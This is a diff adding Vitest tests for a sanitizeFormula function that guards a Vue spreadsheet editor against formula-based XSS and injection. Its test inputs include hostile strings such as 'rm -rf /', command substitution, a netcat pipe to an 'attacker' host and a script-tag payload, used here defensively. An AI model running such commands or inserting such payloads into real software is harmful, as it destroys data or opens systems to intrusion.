@@ -54,6 +54,7 @@ vi.mock('exceljs', () => {
 });
 
 import SpreadsheetEditor from '@/Components/SpreadsheetEditor.vue';
+import { sanitizeFormula } from '@/lib/sanitizeFormula';
 
 beforeEach(() => {
     h.getArrayBuffer.mockClear();
@@ -102,5 +103,30 @@ describe('SpreadsheetEditor', () => {
         await flushPromises();
         expect(wrapper.emitted('ready')).toBeTruthy();
         expect(h.getArrayBuffer).not.toHaveBeenCalled();
+    });
+});
+
+describe('sanitizeFormula (HI-15: defense in depth against jspreadsheet-ce EOL XSS)', () => {
+    it('passes through normal formulas', () => {
+        expect(sanitizeFormula('=SUM(A1:A2)')).toBe('=SUM(A1:A2)');
+        expect(sanitizeFormula('=IF(A1="x",1,0)')).toBe('=IF(A1="x",1,0)');
+        expect(sanitizeFormula('=A1+B1*2')).toBe('=A1+B1*2');
+    });
+
+    it('passes through non-formula values unchanged', () => {
+        expect(sanitizeFormula('hello')).toBe('hello');
+        expect(sanitizeFormula(42)).toBe('42');
+        expect(sanitizeFormula(null)).toBe('');
+        expect(sanitizeFormula(undefined)).toBe('');
+    });
+
+    it('neutralizes formulas containing dangerous characters', () => {
+        // Backticks, $(), semicolons, pipes, ampersands, angle brackets
+        expect(sanitizeFormula('=SUM(A1)`malicious`')).toBe('=');
+        expect(sanitizeFormula('=$(whoami)')).toBe('=');
+        expect(sanitizeFormula('=SUM; rm -rf /')).toBe('=');
+        expect(sanitizeFormula('=A1 | nc attacker 1234')).toBe('=');
+        expect(sanitizeFormula('=<script>alert(1)</script>')).toBe('=');
+        expect(sanitizeFormula('=A1\\nwhoami')).toBe('=');
     });
 });
